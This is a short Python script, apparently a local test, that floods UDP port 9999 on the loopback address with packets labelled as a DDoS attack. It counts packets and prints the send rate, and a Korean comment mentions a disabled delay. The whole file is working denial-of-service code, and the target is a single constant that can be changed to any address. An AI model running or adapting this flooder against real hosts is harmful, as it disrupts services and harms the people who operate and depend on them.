import socket
import time
import sys

TARGET_IP = "127.0.0.1" # local loopback test ip
TARGET_PORT = 9999
MESSAGE = b"BOOM! DDoS Attack Packet!"

def flood():
    print(f"🔥 [{TARGET_IP}:{TARGET_PORT}] UDP Attack Start... (Quit: Ctrl+C)")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    packet_count = 0
    start_time = time.time()
    
    try:
        while True:
            sock.sendto(MESSAGE, (TARGET_IP, TARGET_PORT))
            packet_count += 1
            
            # 너무 시스템이 뻗지 않도록 약간의 딜레이 (초당 약 10만개 수준)
            # time.sleep(0.00001) 
            
            if packet_count % 100000 == 0:
                elapsed = time.time() - start_time
                print(f"Transmission Complete: {packet_count} packets ({packet_count/elapsed:.2f} pkt/sec)")
                
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped.")
        sock.close()
        sys.exit(0)

if __name__ == "__main__":
    flood()
